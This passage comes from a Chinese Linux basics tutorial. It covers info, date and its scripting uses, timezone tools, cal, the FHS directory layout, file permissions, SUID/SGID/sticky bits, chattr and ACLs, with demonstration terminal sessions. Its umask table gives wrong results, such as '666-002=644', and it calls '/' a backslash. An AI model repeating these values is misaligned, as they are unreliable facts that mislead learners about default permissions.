page只有一页，而info页面几乎总是将它们的内容组织成多个区段（称为节点），每个区段也可能包含子区段（称为子节点）。理解这个命令的窍门就是不仅要学习如何在单独的Info页面中浏览导航，还要学习如何在节点和子节点之间切换。可能刚开始会一时很难在info页面的节点之间移动和找到你要的东西，真是具有讽刺意味：原本以为对于新手来说，某个东西比man命令会更好些，但实际上学习和使用起来更困难。 123456789101112131415161718192021222324252627282930313233343536373839语法info(选项)(参数)选项-d：添加包含info格式帮助文档的目录； -f：指定要读取的info格式的帮助文档；-n：指定首先访问的info帮助文件的节点； -o：输出被选择的节点内容到指定文件。参数 帮助主题：指定需要获得帮助的主题，可以是指令、函数以及配置文件。常用快捷键?键：它就会显示info的常用快捷键。N键：显示（相对于本节点的）下一节点的文档内容。P键：显示（相对于本节点的）前一节点的文档内容。U键：进入当前命令所在的主题。M键：敲M键后输入命令的名称就可以查看该命令的帮助文档了。G键：敲G键后输入主题名称，进入该主题。L键：回到上一个访问的页面。 SPACE键：向前滚动一页。BACKUP或DEL键：向后滚动一页。Q：退出info。命令？ 显示帮助窗口在帮助窗口中：Ctrl-x 0 关闭帮助窗口Ctrl-x Ctrl-c 关闭整个 Infoq 退出 infon 打开与本 Node 关联的下一个 Nodep 打开与本 Node 关联的前一个 Nodeu 打开与本 Node 关联的上一个 Nodel 回到上一次访问的 Nodem或g 选择一个菜单项（Node 的名字） 输入指定菜单的名字后按回车，打开指定菜单项关联的 Node空格键 下一页（PageDown 也可以，下一页从当前页的最后两行开始算起） 下一个 Node （若当前页在 Node 文档的末尾）Del 键 上一页（PageUp 也可以，上一页从当前页的开始两行开始算起） 上一个 Node （若当前页 Node 文档的开始）b 或 t 或 Home 文档的开始（b 是 begining 的意思）e 或 End 文档的末尾（b 是 ending 的意思）Ctrl-l 刷新当前页，若当前文档显示情况有问题时Ctrl-g 取消所键入的指令 关于时间的命令datedate命令是显示或设置系统时间与日期。 很多shell脚本里面需要打印不同格式的时间或日期，以及要根据时间和日期执行操作。延时通常用于脚本执行过程中提供一段等待的时间。日期可以以多种格式去打印，也可以使用命令设置固定的格式。在类UNIX系统中，日期被存储为一个整数，其大小为自世界标准时间（UTC）1970年1月1日0时0分0秒起流逝的秒数。 12345678910语法date(选项)(参数)选项-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号；-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号； -u：显示GMT；--help：在线帮助；--version：显示版本信息。参数&lt;+时间日期格式&gt;：指定显示时使用的日期时间格式。 日期格式字符串列表| 格式 | 说明 || :—- | :—————————— || %H | 小时，24小时制（0023） || %I | 小时，12小时制（0112） || %k | 小时，24小时制（023） || %l | 小时，12小时制（112） || %M | 分钟（0059） || %p | 显示出AM或PM || %r | 显示时间，12小时制（hh:mm:ss %p） || %s | 从1970年1月1日00:00:00到目前经历的秒数 || %S | 显示秒（0059） || %T | 显示时间，24小时制（hh:mm:ss） || %X | 显示时间的格式（%H:%M:%S） || %Z | 显示时区，日期域（CST） || %a | 星期的简称（SunSat） || %A | 星期的全称（SundaySaturday） || %h,%b | 月的简称（JanDec） || %B | 月的全称（JanuaryDecember） || %c | 日期和时间（Tue Nov 20 14:12:58 2012） || %d | 一个月的第几天（0131） || %x,%D | 日期（mm/dd/yy） || %j | 一年的第几天（001366） || %m | 月份（0112） || %w | 一个星期的第几天（0代表星期天） || %W | 一年的第几个星期（0053，星期一为第一天） || %y | 年的最后两个数字（1999则是99） || %Y | 年1999 | date 实验1234567891011121314151617181920212223242526272829303132333435363738394041格式化输出[booboo@rhel7 ~]$ date +&quot;%y/%m/%d&quot;16/06/16[booboo@rhel7 ~]$ date +&quot;%Y/%m/%d&quot;2016/06/16输出昨天或后天的日期[booboo@rhel7 ~]$ date -d &quot;1 day ago&quot; +&quot;%Y-%m-%d&quot;2016-06-15[booboo@rhel7 ~]$ date -d &quot;-1 day&quot; +%Y%m%d20160615[booboo@rhel7 ~]$ date -d &quot;+1 day&quot; +%Y%m%d20160617输出50秒后的时间[booboo@rhel7 ~]$ date -d &quot;50 second&quot; +&quot;%Y-%m-%d %H:%M:%S&quot;2016-06-16 02:52:41传说中的1234567890秒[booboo@rhel7 ~]$ date -d &quot;1970-01-01 1234567890 seconds&quot; +&quot;%Y-%m-%d %H:%M:%S&quot;2009-02-13 23:31:302009年2月13日星期五，协调世界时（UTC）晚上11:31:30，UNIX时间将抵达1234567890秒。UNIX时间是UNIX或类UNIX系统使用的时间表示方式：从协调世界时1970年1月1日0时0分0秒起至现在的总秒数，不包括闰秒。由于大部分UNIX的系统都是32位，因此到2038年时间计数就可能溢出，解决方法是更换为64位模式。Linux内核开发者Alan Cox表示，Linux现在都运行64位时间模式，它可以记录到2900亿年后，因此即使太阳燃料用尽也不会出问题。普通格式转化[booboo@rhel7 ~]$ date -d &quot;2016-06-16&quot; +&quot;%Y/%m/%d %H:%M:%S&quot;2016/06/16 00:00:00设定时间需要root用户权限，此处用booboo用户模拟，没有真的修改时间[booboo@rhel7 ~]$ dateThu Jun 16 03:01:19 EDT 2016[booboo@rhel7 ~]$ date -s &quot;02:03:08 2018-05-09&quot;date: cannot set date: Operation not permittedWed May 9 02:03:08 EDT 2018[booboo@rhel7 ~]$ date -s &quot;02:03:08 20180509&quot;date: cannot set date: Operation not permittedWed May 9 02:03:08 EDT 2018[booboo@rhel7 ~]$ date -s &quot;20180509 15:02:02&quot;date: cannot set date: Operation not permittedWed May 9 15:02:02 EDT 2018[booboo@rhel7 ~]$ date -s &quot;2018-05-09 15:02:02&quot;date: cannot set date: Operation not permittedWed May 9 15:02:02 EDT 2018[booboo@rhel7 ~]$ date -s &quot;2019/05/09 15:02:02&quot;date: cannot set date: Operation not permittedThu May 9 15:02:02 EDT 2019 date 拓展实验1) 有时需要检查一组命令花费的时间 比如 123456789101112131415161718ping执行的时间[root@rhel7 ~]# vi a.sh[root@rhel7 ~]# cat a.sh#!/bin/bashstart=$(date +%s)ping -c 10 172.25.0.11 &amp;&gt; /dev/nullend=$(date +%s)difference=$(( $end - $start ))echo $difference seconds.[root@rhel7 ~]# bash a.sh9 seconds.sql脚本运行的是时间#!/bin/bashstart=$(date +%s)$mysql&lt; mysql.all.sql &amp;&gt; /dev/nullend=$(date +%s)difference=$(( $end - $start ))echo $difference seconds. 2) 创建以当前时间为文件名的目录 123[root@rhel7 ~]# mkdir `date +%Y%m%d`[root@rhel7 ~]# ls20160616 3）备份以时间做为文件名的 12345[root@rhel7 ~]# tar -cvf `date +%Y%m%d`.tar ./`date +%Y%m%d`./20160616/[root@rhel7 ~]# ls20160616 Documents Pictures20160616.tar 4）编写shell脚本计算离自己生日还有多少天？12345678910111213141516171819[root@rhel7 ~]# cat bb.sh#!/bin/bashread -p &quot;Input your birthday(YYYYmmdd):&quot; date1m=`date -d &quot;$date1&quot; +%m` #得到生日的月d=`date -d &quot;$date1&quot; +%d` #得到生日的日date_now=`date +%s` #得到当前时间的秒值y=`date +%Y` #得到当前时间的年birth=`date -d &quot;$y$m$d&quot; +%s` #得到今年的生日日期的秒值internal=$(($birth-$date_now)) #计算今日到生日日期的间隔时间if [ &quot;$internal&quot; -lt &quot;0&quot; ]; then #判断今天的生日是否已过 birth=`date --date=&quot;$(($y+1))$m$d&quot; +%s` #得到明年的生日日期秒值 internal=$(($birth-$date_now)) #计算今天到下一个生日的间隔时间fi echo &quot;There is :$(($internal/60/60/24)) days.&quot; #输出结果，秒换算为天Input your birthday(YYYYmmdd):19960506There is :323 days.[root@rhel7 ~]# bash bb.shInput your birthday(YYYYmmdd):19960902There is :77 days. hwclockhwclock命令是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。 在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。 查看 BIOS 时间 修改 BIOS 时间 hwclock --systohc 将硬件时间与系统时间同步,以系统为基准 hwclock --hctosys 将系统时间与硬件时间同步,以硬件为基准 timedatectl比 date 多了时区的功能 rhel6修改时区1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162[booboo@rhel7 ~]$ tzselectPlease identify a location so that time zone rules can be set correctly.Please select a continent or ocean. 1) Africa 2) Americas 3) Antarctica 4) Arctic Ocean 5) Asia 6) Atlantic Ocean 7) Australia 8) Europe 9) Indian Ocean10) Pacific Ocean11) none - I want to specify the time zone using the Posix TZ format.\\#? 5Please select a country. 1) Afghanistan 18) Israel 35) Palestine 2) Armenia 19) Japan 36) Philippines 3) Azerbaijan 20) Jordan 37) Qatar 4) Bahrain 21) Kazakhstan 38) Russia 5) Bangladesh 22) Korea (North) 39) Saudi Arabia 6) Bhutan 23) Korea (South) 40) Singapore 7) Brunei 24) Kuwait 41) Sri Lanka 8) Cambodia 25) Kyrgyzstan 42) Syria 9) China 26) Laos 43) Taiwan10) Cyprus 27) Lebanon 44) Tajikistan11) East Timor 28) Macau 45) Thailand12) Georgia 29) Malaysia 46) Turkmenistan13) Hong Kong 30) Mongolia 47) United Arab Emirates14) India 31) Myanmar (Burma) 48) Uzbekistan15) Indonesia 32) Nepal 49) Vietnam16) Iran 33) Oman 50) Yemen17) Iraq 34) Pakistan\\#? 9Please select one of the following time zone regions.1) east China - Beijing, Guangdong, Shanghai, etc.2) Heilongjiang (except Mohe), Jilin3) central China - Sichuan, Yunnan, Guangxi, Shaanxi, Guizhou, etc.4) most of Tibet &amp; Xinjiang5) west Tibet &amp; Xinjiang\\#? 1The following information has been given: China east China - Beijing, Guangdong, Shanghai, etc.Therefore TZ=&apos;Asia/Shanghai&apos; will be used.Local time is now: Thu Jun 16 15:08:57 CST 2016.Universal Time is now: Thu Jun 16 07:08:57 UTC 2016.Is the above information OK?1) Yes2) No\\#? 1You can make this change permanent for yourself by appending the line TZ=&apos;Asia/Shanghai&apos;; export TZto the file &apos;.profile&apos; in your home directory; then log out and log in again.Here is that TZ value again, this time on standard output so that youcan use the /bin/tzselect command in shell scripts:Asia/Shanghai rhel7 版本123456789[kiosk@foundation0 Desktop]$ timedatectl Local time: Wed 2016-06-15 16:47:40 CST Universal time: Wed 2016-06-15 08:47:40 UTC RTC time: Wed 2016-06-15 16:47:40 Time zone: Asia/Shanghai (CST, +0800) NTP enabled: yesNTP synchronized: yes RTC in local TZ: yes DST active: n/a 关键词：1234567891011121314151617UTC 协调世界时 Coordinated Universal Time 又称世界统一时间，世界标准时间，国际协调时间。1972 年1 月1日，UTC（协调世界时）成为新的世界标准时间。CST 时区缩写 CST可以为如下4个不同的时区的缩写：　　 美国中部时间：Central Standard Time (USA) UT-6:00 澳大利亚中部时间：Central Standard Time (Australia) UT+9:30 中国标准时间：China Standard Time UT+8:00 例如，UTC是0点，那么CST中国为早晨8点 古巴标准时间：Cuba Standard Time UT-4:00RTC Time 硬件时钟时间 set-local-rtc 1 本地时区 set-local-rtc 0 UTCDST Daylight Saving Time日光节约时间、夏令时 是一种为节约能源而人为规定地方时间的制度，在这一制度实行期间所采用的统一时间称为“夏令时间”。 一般在天亮早的夏季人为将时间提前一小时，可以使人早起早睡，减少照明量，以充分利用光照资源，从而节约照明用电。 各个采纳夏时制的国家具体规定不同。目前全世界有近110个国家每年要实行夏令时。 1986年至1991年，中国在全国范围实行了六年夏令时，1992年4月5日后不再实行。 calcal命令用于显示当前日历，或者指定日期的日历。123456789101112131415161718192021222324252627282930313233cal [-smjy13] [[[day] month] year]-1 显示当月日历并将今日标黑-3 显示上个月、当月、下个月。-s 周日作为第一列-m 周一作为第一列-j 列出今天是一年的第几天-y 列出今年所有的月[root@rhel7 ~]# cal June 2016 Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 8 9 10 1112 13 14 15 16 17 1819 20 21 22 23 24 2526 27 28 29 30[root@rhel7 ~]# cal -3 May 2016 June 2016 July 2016 Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 1 2 3 4 1 2 8 9 10 11 12 13 14 5 6 7 8 9 10 11 3 4 5 6 7 8 915 16 17 18 19 20 21 12 13 14 15 16 17 18 10 11 12 13 14 15 1622 23 24 25 26 27 28 19 20 21 22 23 24 25 17 18 19 20 21 22 2329 30 31 26 27 28 29 30 24 25 26 27 28 29 30 31 [root@rhel7 ~]# cal -j June 2016 Sun Mon Tue Wed Thu Fri Sat 153 154 155 156157 158 159 160 161 162 163164 165 166 167 168 169 170171 172 173 174 175 176 177178 179 180 181 182 Linux 基础命令作业 在/tmp 目录下创建 testdir 目录,在该目录下创建 file1 到 file30 的 30 个文件。 删除所有以 file1 起始的文件。 删除 file2 后匹配一个字符的所有文件。 在/home/student 目录下递归创建一个/home/student/a/b/c/d/e 目 录,并且将该 a 目录保留原属性的复制到/tmp 目录下。 将/tmp 下的 a 目录重命名为 test 目录。 统计一下/etc/passwd 文件总共有几行。 在/tmp 下创建一个目录,目录名为 study 在 study 目录下创建一个文件, 文件名任意, 并向这个文件里写 hello 字段 往该文件里追加 study 字段。 查看该文件内容。 统计一下该文件共有几行,几个单词,几个字节。 将/etc/passwd 里以 bash 结尾的行过滤出来,并从中截取第一列字段内容。 统计/boot/下所有文件的属性中含 root 字段的文件共有几个。 熟悉一下 vim 编辑器,利用 vim 编辑器书写整理一下今天所学的 知识点。 判断一下 boot 目录下文件的内容类型,并将属于 ASCII 码文件内容 类型的文件名显示到屏幕上","link":"/2016/12/22/booboo_linux_base/01-Linux-basic-command/"},{"title":"Linux 文件和目录","text":"Linux 目录Linux 目录配置的依据 –FHS因为利用 Linux 来开发产品或 distributions 的社区 / 公司或个人实在太多了 , 如果每个人都用自己的想法来配置文件放置的目录 , 那将可能造成很多管理上的困扰。 你能想象 , 你进入一个企业之后 , 所 接触到的 Linux 目录配置方法竟然跟你以前学的完全不同吗 ? 很难想象吧 ~ 所以 , 后来就有所谓的Filesystem Hierarchy Standard (FHS) 标准的出炉了 ! 根据 FHS(http://www.pathname.com/fhs/) 的官方文件指出 , 他们的主要目的是希望让使用者可以了解到已安装软件通常放置在哪个目录下 , 所以他们希望独立的软件开发商、操作系统制作者、以及想要维护系统的用户 , 都能够遵循 FHS 的标准。 也就是说 ,FHS 的重点在于规范每个特定的目录下应该存放什么样子的数据而已。 亊实上 ,FHS 是根据过去的经验一直再持续的改版的 ,FHS 依据文件系统使用的频繁与否允许使用者随意更动 , 而将目录定义成为四种交互作用的形态 , 用表格来说有点像底下这样 ： 可分享的 (shareable) 不可分享的 (unshareable) 不变的 (static) /usr ( 软件放置处 ) /etc ( 配置文件 ) /opt ( 第三方协力软件 ) /boot ( 开机不核心档 ) 可变动的 (variable) /var/mail ( 使用者邮件信箱 ) /var/run ( 程序相关 ) /var/spool/news ( 新闻组 ) /var/lock ( 程序相关 ) 目录树在类 Unix 系统中并不存在 C/D/E/F 盘符,一切的文件都是从 “ 根 (/)” 目录开始的并按照文件系统目录标准 FHS 采用树形结构来存放文件并定义了每个区域的用途。 目录名称严格的区分大小写,例如 root 、 rOOt 、 Root 、 rooT 等等均代表是不同的独立目录,并且名称中不得包含反斜杠 (/) 。 主要常见的目录定义: 目录名称 应放置文件的内容 /boot 开机所需文件 —— 内核,开机菜单及所需配置文件等 /dev 任何设备与接口都以文件形式存放在此目录 /etc 配置文件 /home 用户主目录 /bin 单用户维护模式下还能够被操作的命令 /lib 开机时用到的函数库及/bin 与/sbin 下面命令要调用的函数 /sbin 开机过程中需要的 /media 一般挂载或删除的设备 /opt 放置第三方的软件 /root 系统管理员的主文件夹 /srv 一些网络服务的数据目录 /tmp 任何人均可使用的 “ 共享 ” 临时目录 /proc 虚拟文件系统,例如系统内核,进程,外部设备及网络状态等 /usr/local 用户自行安装的软件 /usr/sbin 非系统开机时需要的软件/命令/脚本 /usr/share 帮助与说明文件,也可放置共享文件。 /var 主要存放经常变化的文件,如日志。 /lost+found 当文件系统发生错误时,将一些丢失的文件片段存放在这里1.3 路径 另外一个重要的概念 “ 路径 ” ,这个路径指的是如何找到某个文件,分为 “ 绝对路径 ” 与 “ 相对路径 ” : 绝对路径 (absolute): 由根目录 (/) 开始写起的目录或文件名 相对路径 (relative): 相对于当前路径的写法 举例来说一个客人想找下厕所,你有两种回答的方法。 绝对路径:首先坐车来到你家,到了你家后，右手边第一个房间就是厕所。 相对路径:前面右拐第一个房间。 如果你说的是绝对路径,那么任何客人都可以按照这个提示找到你家的厕所,但缺点是过于繁琐,如果说的是相对路径,那么这个人并不是在每个路口右转都能找到厕所,缺点是不具备普遍性。 123456[root@rhel7 ~]# cd /etc/sysconfig/network-scripts/[root@rhel7 network-scripts]# pwd/etc/sysconfig/network-scripts[root@rhel7 network-scripts]# cd ../modules[root@rhel7 modules]# pwd/etc/sysconfig/modules 文件属性类 Unix 系统的设计初衷就是为让多用户同时工作,所以也迫使 Linux 系统有了极强的安全性。接下来我们一起来看看 linux 系统示如何实现安全性的。 123456789101112131415161718192021222324[root@rhel7 tmp]# ll /total 4148lrwxrwxrwx. 1 root root 7 May 5 17:28 bin -&gt; usr/bindr-xr-xr-x. 4 root root 4096 May 5 17:40 bootdrwxr-xr-x. 15 root root 4096 Aug 19 13:19 content-rw------- 1 root root 2166784 Aug 8 05:24 core.2052-rw------- 1 root root 19017728 Aug 8 05:27 core.2488drwxr-xr-x 19 root root 3380 Oct 26 12:22 devdrwxr-xr-x. 138 root root 12288 Oct 26 12:22 etcdrwxr-xr-x. 4 root root 31 Aug 23 17:32 homelrwxrwxrwx. 1 root root 7 May 5 17:28 lib -&gt; usr/liblrwxrwxrwx. 1 root root 9 May 5 17:28 lib64 -&gt; usr/lib64drwxr-xr-x. 2 root root 6 May 25 2015 mediadrwxr-xr-x. 2 root root 6 May 25 2015 mntdrwxr-xr-x. 4 root root 36 May 6 13:19 optdr-xr-xr-x 229 root root 0 Oct 26 2016 procdr-xr-x---. 26 root root 4096 Oct 12 14:11 rootdrwxr-xr-x 39 root root 1200 Oct 26 12:24 runlrwxrwxrwx. 1 root root 8 May 5 17:28 sbin -&gt; usr/sbindrwxr-xr-x. 2 root root 6 May 25 2015 srvdr-xr-xr-x 13 root root 0 Oct 26 2016 sysdrwxrwxrwt. 31 root root 4096 Oct 26 12:42 tmpdrwxr-xr-x. 13 root root 4096 May 5 17:28 usrdrwxr-xr-x. 23 root root 4096 Oct 26 2016 var 第二字段,文件硬链接数或目录子目录数 文件的分类 文件 操作 普通文件 纯文本档 (ASCII) touch file 二进制文件 (binary) 数据格式文件 (data) 目录 (directory) mkdir dire 连结档 (link) ln file hfile ln -s file sfile ln -s ‘pwd’/file ssfile 绝对路径的软链接文件 设备与装置文件 (device) mknod bfile b 252 0 块设备 mknod cfile c 4 2 字符设备 数据输送文件 (FIFO, pipe) mkfifo pfile 管道文件 资料接口文件 (sockets) mksock sfile sock 文件 -: 普通文件, d: 目录文件, l: 链接文件, b: 块设备文件, c: 字符设备文件, p: 管道文件 一般权限 UGOLinux 系统中一切都是文件,文件和目录的所属与权限 —— 来分别规定所有者、所有组、其余人的读,写,执行权限。 读 (read) ,写 (write) ,执行 (execute )简写即为 (r,w,x) ,亦可用数字 (4,2,1) 表示 权限 读 写 执行 读 写 执行 读 写 执行 字符表示 r w x r w x r w x 数字表示 4 2 1 4 2 1 4 2 1 权限分配 文件所有者 文件所属组 其他用户 举例 : 如果某文件权限为 7 则代表可读,可写,可执行 (4+2+1) 。若权限为 6(4+2) 则代表可读,可写。那么权限为 5 与 3 时分别代表了什么? 答案:权限为 5 代表可读 (4) 和可执行 (1) 。而权限为 3 代表可写 (2) 和可执行 (1) 。 文件的权限为 rw-r–r– 也就是分别表示所有者 ( 属主 ) 有读写权限,所有组 ( 属组 ) 有读权限,其余人也仅有读权限。 这个时候发现问题了吗?对于目录文件的读和写权限我们还可以理解,目录要能执行操作? 普通文件即实际保存数据的地方,其并不具备删除自身的权限: r: 可读取文件的实际内容 w: 可编辑 / 新增 / 修改该文件的实际内容 x: 可被执行 目录文件即保存有目录结构和文件权限: r: 可读取目录结构和权限 w: 可更改目录结构列表、新建 / 删除 / 重命名 / 转移子文件 / 目录。 x: 表示用户可进入到该目录中 特殊权限 suid\\sgid\\sticky单纯对文件位置的 rwx 权限肯定不能满足我们对安全、便捷工作的需求,所以便有了 SUID 与 SGID 的特殊权限机制。 SUID 范围 : 二进制的可执行的文件 作用 : 临时拥有所有者的权限 SGID 范围 : 目录或者拥有可执行权限的文件 作用 : 继承目录所属组 SBIT ( STICKY ) 范围 : 目录 作用 : 只有 root 用户和文件拥有者有权删除目录中的文件。 SUID 比如:-rwsr-xr-x. 1 root root 27832 Jan 30 2014 /usr/bin/passwd 所有用户都可以执行用于修改用户密码的 passwd 命令,但用户密码保存在 /etc/shadow 文件中,默认权限是 000 即除了超级用户 root 外的所有用户都没有查看或编辑该文件的权限,所以对 passwd 命令加上SUID 权限位,则可让普通用户临时获得程序所有者的身份,即以 root 用户的身份将变更的密码信息写入到 shadow 文件中。 ---s--x--x. 1 root root 130712 Sep 1 2015 sudo SGID: 功能一:让执行者临时拥有属组的权限(对拥有执行权限的二进制程序设置) 举例:1234-r-xr-sr-x. 1 root tty-rwxr-sr-x. 1 root tty15344 Jan 27 2014 wall19536 Aug 21 2015 write 功能二:在该目录中创建的文件自动继承此目录的用户组(只可以对目录设置) 比如:我们将某个部门的工作目录给予了 SGID 权限,这样所有人创建的文件都归相同的工作组,这样方便以后的管理。 SBIT(Sticky Bit): 比如:drwxrwxrwt. 7 root root 4096 Jun 22 13:20 /tmp 一般老师希望学生可以将作业上传到某个特定目录 —— 但为了避免某些小破坏份子,想限制删除其他人文件的话,那就要设置 SBIT 位了,当然也可以叫做特殊权限位之粘滞位。 隐藏属性 ATTR文件权限除了 UGO 读写执行与 SUID 、 SGID 、 SBIT 外还有一种隐藏权限,例如明明有权限删除某个文件却报错了,或者仅能为某个文件追加内容而不能减少内容,遇到这种很 “ 奇怪 ” 的文件,就要怀疑是文件被设置隐藏权限了。 chattr 命令用于设置文件的隐藏权限,格式为: “ chattr [ 参数 ] 文件 ” 。 参数 作用 i 将无法对文件进行修改,若对目录设置后则仅能修改子文件而不能新建或删除。 a 仅允许补充(追加)内容.无法覆盖/删除(Append Only)。 S 文件内容变更后立即同步到硬盘(sync)。 s 彻底从硬盘中删除,不可恢复(用 0 填充原文件所在硬盘区域)。 A 不再修改这个文件的最后访问时间(atime)。 b 不再修改文件或目录的存取时间。 D 检查压缩文件中的错误。 d 当使用 dump 命令备份时忽略本文件/目录。 c 默认将文件或目录进行压缩。 u 当删除此文件后依然保留其在硬盘中的数据,方便日后恢复。 t 让文件系统支持尾部合并(tail-merging)。 X 可以直接访问压缩文件的内容。 lsattr 命令用于显示文件的隐藏权限,格式为: “ lsattr [ 参数 ] 文件 ” 。 参数 作用 a 显示所有文件和目录。 l 显示隐藏属性的全称(默认简写成一个字母)。 R 递归处理,将指定目录下的所有文件及子目录一并处理。 d 若目标文件为目录,请加此参数。 具体用法见第三章节 文件访问控制列表 ACL不知大家有没有发现其实上面讲解的 rwx 权限、特殊权限、隐藏权限都是对某一类用户设置的,而如果希望对某个指定的用户进行单独的权限设置,那么就需要用文件的访问控制列表来实现啦。 我们可以基于普通文件或目录设置进行设置 ACL ,通俗来说 ACL 就是设置指定的特定用户或用户组对某个文件的操作权限。并且如果对某个目录设置了访问控制策略,那么子文件则继承其访问策略,而若对文件设置了访问控制策略则不再继承上级目录的控制策略。 ACL:Access Control List 缩写 ,UGO 的 rwx 权限以外的细部权限设置。 setfacl 命令用于增加或者修改 ACL 规则,格式为: ” setfacl [ 参数 ] 文件 ” 。 getfacl 命令用于显示文件的 ACL 规则,格式为: ” getfacl 文件 ” 。 详细命令用法请看第三章节。 文件相关的命令 文件 命令 解释 文件的管理 ls ,cd, pwd, touch,mkdir, rmdir 新建、删除 cp, rm, mv 复制、删除、移动 文件内容的查看 cat, tac, nl 直接查看内容 more, less 可翻页查看 head, tail 资料撷取 od 非纯文本档 文件的权限 chmod chown 文件的拥有者和所属组 ugo 权限 umask 文件预设 chattr, lsattr 文件隐藏属性 SUID, SGID, SBIT 文件特殊权限 文件类型 file 文件类型查看 文件的搜索 which 指令文件的搜索 whereis, locate, find 文件的搜索 权限的修改 chmod chown chgrp umaskchmodchmod [ u g o a 所有用户 ] [ + - = ] [ rwx] /[ 777] w 结合 x 权限可以对目录下的文件进行以下操作 : cd rm touch cp r 结合 x 权限可以对目录下的文件进行 ls 操作 x 决定了能否进入目录 12345[ root@www tmp]# ll dabao-rw-r--r--. 1 root root 0 Mar 21 06:09 dabao[ root@www tmp]# chmod 777 dabao[ root@www tmp]# ll dabao-rwxrwxrwx. 1 root root 0 Mar 21 06:09 dabao3.1.2 chown chown user:group 目录 / 文件 -R 针对目录递归修改拥有者 12345678910111213[ root@www tmp]# chown dabao. dabao[ root@www tmp]# ll dabao-rwxrwxrwx. 1 dabao dabao 0 Mar 21 06:09 dabao[ root@www tmp]# chown -R dabao dabao1[ root@www tmp]# ll -R dabao1dabao1:total 4drwxr-xr-x. 3 dabao root 4096 Mar 21 06:11 1dabao1/1:total 4drwxr-xr-x. 2 dabao root 4096 Mar 21 06:11 2dabao1/1/2:total 0 chgrp修改文件目录的所属组 12345678910[ root@www tmp]# chgrp -R dabao dabao1[ root@www tmp]# ll -R dabao1dabao1:total 4drwxr-xr-x. 3 dabao dabao 4096 Mar 21 06:11 1dabao1/1:total 4drwxr-xr-x. 2 dabao dabao 4096 Mar 21 06:11 2dabao1/1/2:total 0 umaskumask 创建文件 / 目录的默认权限 公式 最大权限 -umask= 默认权限 user 文件 666 -002 = 644 rw-rw-r– root 文件 666 -022 = 664 rw-r–r– user 目录 777 -002 = 755 rwxrwxr-x root 目录 777 -022 = 775 rwxr-xr-x umask 777 只针对当前环境临时生效 12[ root@www tmp]# umask0022 相关文档 /etc/profile ~/.bash_profile /etc/profile 定义了普通用户和 root 用户的 umask 值 , 对所有用户生效 ~/.bash_profile 可以定义当前用户的 umask 值 , 只对当前用户生效 , 需要重新登陆用户后生效。 默认属性相加减 , 则档案变成 :666-003=663, 是 -rw-rw–wx , 错 !! ATTR 权限命令 chattr lsattrchattr配置文件案隐藏属性 属性设置常见的是 a 和 i 的设定 , 必须要 root 身份 chattr [ +-= ][ ASacdistu] 文件 / 目录 参数 作用 + 增加 - 移除 = 设定为 A 访问时间 atime 不修改 , 对速度较慢计算机有帮助 S 『同步』写入磁盘 a 只能增加数据 , 不能删除 / 修改数据 (root) c 自动『压缩』 , 读取时自动解压缩 d 不被 dump 备份 i 以下操作不可执行 : 『删除、改名、设置连结、写入、新增资料』 ( root ) s 彻底删除 , 无法挽回 u 与 s 相反 , 删除可挽回 lsattrlsattr [ -adR] 文件 / 目录 参数 作用 -a 显示隐藏文件的属性 -d 仅列出目录本身属性 -R 连同子目录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657A 访问时间 atime 不修改[root@rhel7 tmp]# chattr +A file1[root@rhel7 tmp]# lsattr file1-------A-------- file1[root@rhel7 tmp]# cat file1hi[root@rhel7 tmp]# stat file1File: ‘file1’Size: 3Blocks: 8IO Block: 4096 regular fileDevice: fd00h/64768dInode: 52973916 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:user_tmp_t:s0Access: 2016-06-22 14:49:50.221000000 +0800Modify: 2016-06-22 14:49:48.025000000 +0800Change: 2016-06-22 14:50:14.621000000 +0800Birth: -[root@rhel7 tmp]# cat file1hi[root@rhel7 tmp]# stat file1File: ‘file1’Size: 3Blocks: 8IO Block: 4096 regular fileDevice: fd00h/64768dInode: 52973916 Links: 1Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)Context: unconfined_u:object_r:user_tmp_t:s0Access: 2016-06-22 14:49:50.221000000 +0800Modify: 2016-06-22 14:49:48.025000000 +0800Change: 2016-06-22 14:50:14.621000000 +0800Birth: -[root@rhel7 tmp]# chattr -A file1a 只能增加数据 , 不能删除 / 修改数据 (root)[root@rhel7 tmp]# chattr +a file1[root@rhel7 tmp]# lsattr file1-----a---------- file1[root@rhel7 tmp]# echo 99 &gt; file1-bash: file1: Operation not permitted[root@rhel7 tmp]# echo 99 &gt;&gt; file1[root@rhel7 tmp]# cat file1hi99i 以下操作不可执行 : 『删除、改名、设置连结、写入、新增资料』 ( root )[root@rhel7 tmp]# chattr +i file1[root@rhel7 tmp]# rm -rf file1rm: cannot remove ‘file1’: Operation not permitted[root@rhel7 tmp]# mv file1 file100mv: cannot move ‘file1’ to ‘file100’: Operation not permitted[root@rhel7 tmp]# link file1 file1hlink: cannot create link ‘file1h’ to ‘file1’: Operation not permitted[root@rhel7 tmp]# echo nini&gt;&gt;file1-bash: file1: Permission denied[root@rhel7 tmp]# chattr -i file1[root@rhel7 tmp]# lsattr file1---------------- file1 ACL 权限命令ACL 权限概念ACL:Access Control List 缩写 ,UGO 的 rwx 权限以外的细部权限设置。 ACL 可以针对单一用户 , 单一文件 , 单一目录 r,w,x 的权限规范 针对几个项目 : 使用者 (user): 可以针对使用者设定权限 群组 (group): 针对群组为对象设定权限 默认属性 (mask): 还可以针对在该目录下在建立新档案或目录时 , 规范新数据的默认权限 getfacl取得文件 / 目录的 ACL 设定内容 getfacl filename 1234567[root@www tmp]# getfacl dabao file: dabao owner: dabao group: dabaouser::rwxgroup::rwxother::rwx setfacl设置文件 / 目录的 ACL 规范 setfacl [-bkRd] [{-m|-x} acl 参数 ] 目标文件名 参数 